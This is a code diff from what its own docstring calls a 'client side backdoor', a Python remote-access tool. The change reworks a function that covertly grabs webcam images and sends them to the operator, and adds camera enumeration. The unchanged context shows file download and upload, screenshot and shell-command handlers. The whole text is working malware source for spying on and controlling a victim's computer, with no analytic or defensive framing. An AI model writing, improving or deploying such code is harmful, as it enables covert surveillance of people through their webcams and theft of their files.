@@ -13,12 +13,13 @@ from pathlib import Path
 from json import loads as jloads
 from pickle import loads, dumps
 from subprocess import getoutput
-from requests import get, packages
+from requests import get
 from os import uname, chdir, getcwd
 from time import sleep, time
-#from packages.urllib3.exceptions import InsecureRequestWarning
+from urllib3.exceptions import InsecureRequestWarning
+from urllib3 import disable_warnings
 
-#packages.urllib3.disable_warnings(InsecureRequestWarning)
+disable_warnings(InsecureRequestWarning)
 
 class Client(object):
     """ client side backdoor """
@@ -43,32 +44,45 @@ class Client(object):
         except PermissionError:
             self.sendHeader({"content": f"Permission denied: {args}", "sucess": False})
 
-    # taking a webcam shot
-    def webcamshot(self, args):
-        wcamshots = [VideoCapture(id).read()[1] for id in range(10) if VideoCapture(id).isOpened()] # trying to detect and get any frame from webcam
+    # checking if exist any available webcam to use
+    def checkAvailableWebcams(self):
+        # trying to detect any available webcam and return ids if exists
+        availableWebcams = [f'{id+1} ' for id in range(10) if VideoCapture(id).isOpened()]
 
-        if wcamshots: # if exists any frame
-            data = [imencode('.png', frame)[1].tobytes() for frame in wcamshots] # "converting" all the frames to save
-            identifier = 0 if not args else int(args) - 1
-
-            try:
-                header = {
-                    "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
-                    "extension": '.png',
-                    "bytes": len(data[identifier]),
-                    "path": "screenshots",
-                    "numofcams": len(wcamshots),
-                    "sucess": True,
+        if availableWebcams:
+            return {
+                "sucess": True,
+                "content": f"[green]There's [yellow]{len(availableWebcams)}[green] webcams available | IDs: [white]{''.join(webcamId for webcamId in availableWebcams)}"
                 }
+        
+        return {"sucess": False, "content": "[red]There's no webcam available"}
 
-                self.sendHeader(header)
-                sleep(0.5)
-                self.__Client.send(data[identifier])
-            
-            except IndexError:
-                self.sendHeader({"content": f"There's no webcam with ID {identifier+1}", "sucess": False})
+    # taking a webcam shot from id
+    def webcamshot(self, args):
+        if args:
+            try:
+                # trying to taking a webcam shot and converting the frame in to bytes string
+                wcamshot = imencode('.png', VideoCapture(int(args)-1).read()[1])[1].tobytes() if VideoCapture(int(args)-1).isOpened() else False
+                
+                if wcamshot and int(args) > 0: # if there is any frame by the given id
+                    header = {
+                        "namefile": datetime.now().strftime('%d.%m.%y-%H.%M.%S'),
+                        "extension": '.png',
+                        "bytes": len(wcamshot),
+                        "path": "screenshots",
+                        "sucess": True
+                    }
+
+                    self.sendHeader(header)
+                    sleep(0.5)
+                    self.__Client.send(wcamshot)
+                else:
+                    self.sendHeader({"content": f"[red]There's no webcam with ID [yellow]{args}", "sucess": False})
+            except ValueError:
+                self.sendHeader({"content": f"[red] Invalid Id [yellow]{args}[red], must be a number", "sucess": False})
         else:
-            self.sendHeader({"content": f"There's no webcam available", "sucess": False})
+            availableWebcams = self.checkAvailableWebcams()
+            self.sendHeader(availableWebcams)
 
     # taking a screenshot
     def screenshot(self, args):
@@ -150,7 +164,7 @@ class Client(object):
             "/download": {"action": self.download},
             "/upload": {"action": self.upload},
             "/webcamshot": {"action": self.webcamshot},
-            "cd": {"action":  self.changeDirectory}
+            "cd": {"action": self.changeDirectory}
         }
 
     # returns function of the command (your action) and your respective arguments, if exists, if not returns False (is a shell command).
